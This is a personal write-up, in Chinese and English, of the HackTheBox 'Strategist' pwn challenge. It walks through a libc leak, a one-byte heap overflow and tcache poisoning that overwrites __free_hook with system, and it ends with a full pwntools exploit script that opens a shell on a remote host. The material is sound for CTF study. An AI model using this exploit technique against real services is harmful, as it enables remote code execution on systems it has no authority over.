# 1.0 Challenge
1. how to leak libc?
2. how to use the double free to build payload?
3. where to inject?

# 2.0 Analysis
有点像 [[PWN -- BookManager -- Double-free magic-door]]
就像
```
add(0x500)
add(0x8)
add(0x8)
show(0) <- leak

free(1)
free(2)

edit(2,p64(VICTIM))
add(0x8)

add(0x8)
onegadget 

edit(4,p64(onegadget[1])) 

win()
```

分析一下
- `Create`
- `Show`
- `Edit`
- `Delete`
小不同是
BOOK MANAGER 是
create 500 0
create 8 1
create 8 2
free 0 
show 0 (showable)
他没有check
```
int show_book()
{
  __int64 v0; // rax
  signed int v2; // [rsp+Ch] [rbp-4h]

  puts("Book index:");
  v2 = read_int();
  if ( (unsigned int)v2 > 4 )
  {
    puts("Invalid index!");
    LODWORD(v0) = 0;
  }
  else
  {
    v0 = *((_QWORD *)&books + v2);
    if ( v0 )
      LODWORD(v0) = printf("OUTPUT: %s\n", *((const char **)&books + v2));
  }
  return v0;
}
```
Strategist 是
create 500 0
create 8 1
create 8 2
free 0 
show 0 (not showable showable)
```
多了这个
  if ( v2 >= 0x64 || !*(8LL * v2 + a1) )
  {
    printf("%s\n[%sSir Alaric%s]: There is no such plan!\n\n", "\x1B[1;31m", "\x1B[1;33m", "\x1B[1;31m");
    exit(1312);
  }
```
# 3.0 Solution
## 3.1 HOW TO LEAK LIBC?
跟 [[PWN -- BookManager -- Double-free magic-door]] 一样
只是这边要叫回 free 的 0x500 因为 他会会check index
add(0x500)
add(0x8)
free(0)
free(1)
add(0x500)
show(0)

3.2 how to use the double free to build payload?
我看到 BOOK MANAGER 是 double free 完后 [2,1,0]
直接edit double 的 chunk 2 to victim stack
add(8) 3
add(8) 4
edit 4 to one gadget
win

可是为什么 这里不一样？
这边没有 win function
现在的情况是
```
add(0x500) 0
add(0x8) 1
free(0) [0]
free(1) [0,1]
add(0x500) 
show(0)
```
STOP HERE !!!!

---
```
create 0x500 0
create 0x38  1
create 0x38  2

free 0
free 2
free 1

------------ LIBC
create 0x500 0
show 0

------------ HEAP
create 0x38 1
show 1

------------ DELETE EVERYTHING
free 0
free 1

------------ OFF BY ONE
create 0x508 0x507


```

FCKKKKKKKKKKKKKKKKKKKKKKKKKKKK

----
```
create 0x511 0
create 0x20  1

free 0

------------ LIBC
create 0x500 0
show 0

------------ PREPARE OFF BY ONE
create 0x28 0x28 2
create 0x20 0x20 3 <- ready for overflow this chunk
create 0x20 0x20 4
create 0x20 0x20 5

------------ START OFF BY ONE
edit 2 0x28 + \x91

------------ TCACHE MANIPULATION & POISONING 
free 3 -> NULL
free 5 [5 -> NULL]
free 4 [4 -> 5 -> NULL]

tcache list [4 -> 5 -> NULL] 

create 0x80 0x30+p64(libc.symbols.__free_hook) [5 -> NULL] 
create 0x20 0x4(ffff)  
create 0x20 p64(libc.symbols.system))

free 1

------------ INTERACTION
ti()
```

只看这个！！！！！！！！！！！！！！！！！！！ 最重要的部分
HEAP INFO STEP BY STEP
```
create 0x511 0x4 0

0x410 FREED A
0x520 USED ------ 0
tcache list [A+0x10] 

**********************************************
create 0x20 /bin/sh\x00 1

0x410 FREED A
0x520 USED ------ 0
0x30  USED ------ 1
tcache list [A+0x10] 

**********************************************
free 0

0x410 FREED A
0x520 FREED ------ 0
0X30  USED ------ 1 ------  PREV 0x520
tcache list [A+0x10] 
unsortedbin list [0 -> main_arena+96 <- 0] 

********************************************** LEAK LIBC
create 0x20 0x8 0

0x410 FREED A 
0X30  USED ------ 0
0x4f0 FREED B
0X30  USED ------ 1 ------  PREV 0x4f0
tcache list [A+0x10] 
unsortedbin list [B -> main_arena+96 <- B] 

**********************************************
show 0

********************************************** PREPARE OFF BY ONE
create 0x28 0x28 2

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0x4C0 FREED C ------  PREV AAAAAAAAAAAA
0X30  USED ------ 2 ------  PREV 0x4C0
tcache list [A+0x10] 
unsortedbin list [C -> main_arena+96 <- C] 

**********************************************
create 0x20 0x20 3 <- ready for overflow this chunk
create 0x20 0x20 4
create 0x20 0x20 5

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0X30  USED ------ 2 ------  PREV AAAAAAAAAAAA
0X30  USED ------ 3
0X30  USED ------ 4
0x430 FREED D
0X30  USED ------ 5 ------  PREV 0x430
tcache list [A+0x10] 
unsortedbin list [D -> main_arena+96 <- D] 


********************************************** START OFF BY ONE
edit 2 d*0x28 + \x91

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0X90  USED ------ 2 3 4------  PREV DDDDDDDDDD
0x430 FREED D
0X30  USED ------ 5 ------  PREV 0x430
tcache list [A+0x10] 
unsortedbin list [D -> main_arena+96 <- D] 


********************************************** TCACHE MANIPULATION & POISONING 
free 3 -> NULL (3 4 under 2 chunks)

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0X90  FREED ------ 2 4------  PREV DDDDDDDDDD
0x430 FREED D
0X30  USED ------ 5 ------  PREV 0x430
tcache list 
0x90 [2+0x10]
0x410 [A+0x10] 
unsortedbin list [D -> main_arena+96 <- D] 

**********************************************
free 5 [5 -> NULL]

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0X90  FREED ------ 2 4------  PREV DDDDDDDDDD
0x430 FREED D
0X30  USED ------  ------  PREV 0x430
tcache list 
0x30 [2+0x30+x30]
0x90 [2+0x10]
0x410 [A+0x10] 
unsortedbin list [D -> main_arena+96 <- D] 

**********************************************
free 4 [4 -> 5 -> NULL]

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0X90  FREED ------ 2 ------  PREV DDDDDDDDDD
0x430 FREED D
0X30  USED ------  ------  PREV 0x430
tcache list 
0x30 [2+0x30] -> [2+0x30+x30]
0x90 [2+0x10]
0x410 [A+0x10] 
unsortedbin list [D -> main_arena+96 <- D] 

********************************************** OVERWRITE FREE HOOK
create 0x80 0x30+p64(libc.symbols.__free_hook) [5 -> NULL] 

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0X90  USED ------ 2 4:FREE_HOOK ------  PREV DDDDDDDDDD
0x430 FREED D
0X30  USED ------  ------  PREV 0x430
tcache list 
0x30 [2+0x30] -> 0x7f14b7fed8e8 (__free_hook)
0x410 [A+0x10] 
unsortedbin list [D -> main_arena+96 <- D] 

0x55f6f9edb6c8: 0x0000000000000091      0x6565656565656565
0x55f6f9edb6d8: 0x6565656565656565      0x6565656565656565
0x55f6f9edb6e8: 0x6565656565656565      0x6565656565656565
0x55f6f9edb6f8: 0x6565656565656565      0x00007fc346fed8e8

**********************************************
create 0x20 0x4(ffff)  

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0X90  USED ------ 2 4:FREE_HOOK 3------  PREV DDDDDDDDDD
0x430 FREED D
0X30  USED ------ 5 ------  PREV 0x430
tcache list 
0x30 0x7f14b7fed8e8 (__free_hook)
0x410 [A+0x10] 
unsortedbin list [D -> main_arena+96 <- D] 

0x55f7d4b036c8: 0x0000000000000091      0x6565656565656565
0x55f7d4b036d8: 0x6565656565656565      0x6565656565656565
0x55f7d4b036e8: 0x6565656565656565      0x6565656565656565
0x55f7d4b036f8: 0x6565656565656565      0x00007f7366666666

********************************************** FREE HOOK TO SYSTEM
create 0x20 p64(libc.symbols.system))

0x410 FREED A 
0X30  USED ------ 0
0X30  USED ------ 1
0X90  USED ------ 2 4:SYSTEM 3 ------  PREV DDDDDDDDDD
0X30  USED ------ 7
0x430 FREED D
0X30  USED ------ 5 ------  PREV 0x430
tcache list 
0x410 [A+0x10] 
unsortedbin list [D -> main_arena+96 <- D] 

pwndbg> tele FREEHOOK 
00:0000│  0x7f5e401ed8e8 (__free_hook) —▸ 0x7f5e3fe4f550 (system) ◂— test rdi, rdi
01:0008│  0x7f5e401ed8f0 (__malloc_initialize_hook@GLIBC_2.2.5) ◂— 0
... ↓     6 skipped
**********************************************
free 1

free = system
1 = /bin/sh\x00

free 1 = system("/bin/sh\x00")

------------ INTERACTION
ti()
```

4.0 FLAG 
# 5.0 FINAL SCRIPT 
```python
# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
context.arch='amd64'
context.os = "linux"

pc = "./strategist_patched"

libc  = ELF('./libc.so.6', checksec=False)
ld = ELF("./ld-2.27.so")
exe = context.binary = ELF(pc)



scripts = """
set resolve-heap-via-heuristic force
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)
 

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f').ljust(8, b'\x00')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)


# === Exploit helper functions ===
def create(size, data):
    sla(b'> ', b'1')
    sla(b'> ', str(size).encode())
    sa(b'> ', data)

def show(idx, delimiter):
    sla(b'> ', b'2')
    sla(b'> ', str(idx).encode())
    ru(f'Plan [{idx}]: '.encode() + delimiter)
    return rl()[:-1]

def edit(idx, data):
    sla(b'> ', b'3')
    sla(b'> ', str(idx).encode())
    sa(b'> ', data)

def delete(idx):
    sla(b'> ', b'4')
    sla(b'> ', str(idx).encode())



create(0x511, b'aaaa')            # Chunk 0
create(0x20, b'/bin/sh\x00')      # Chunk 1

delete(0)

create(0x20, b'a'*8)              # Chunk 2 (overlap)

libc_leak = u64(show(0, b'a'*8).ljust(8, b'\x00'))
libc.address = libc_leak - 0x3ec0d0
lg('libc leak', libc_leak)
lg('libc base', libc.address)

create(0x28, b'a'*0x28)           # Chunk 3
create(0x20, b'b'*0x20)           # Chunk 4
create(0x20, b'b'*0x20)           # Chunk 5
create(0x20, b'b'*0x20)           # Chunk 6

edit(2, b'd'*0x28 + b'\x91')      # Overflow into chunk header

delete(3)
delete(5)
delete(4)

create(0x80, b'e'*0x30 + p64(libc.symbols.__free_hook))  # Chunk 7
lg('__free_hook', libc.symbols.__free_hook)

create(0x20, b'ffff')             # Chunk 8
create(0x20, p64(libc.symbols.system))  # Chunk 9 (overwrite __free_hook)
lg('system', libc.symbols.system)

# dbg()  # break before triggering free("/bin/sh")
delete(1)  # Trigger system("/bin/sh")

ti()

```

# 6.0 REFERENCE
official
https://github.com/hackthebox/cyber-apocalypse-2025/blob/main/pwn/%5BMedium%5D%20Strategist/htb/solver.py

解释到不错
https://github.com/olexamatej/olexamatej.github.io/blob/6450f73e08d0c7efdb7d933fe4a0c74a9f992087/blogs/strategist.qmd#L21

整齐 先看这个 
https://github.com/Younesfdj/Write-ups/blob/2d5c9c4210bc408f2f5609ec9ec27f150a304b67/Cyber-Apocalypse-2K25/pwn/strategist/solve.py
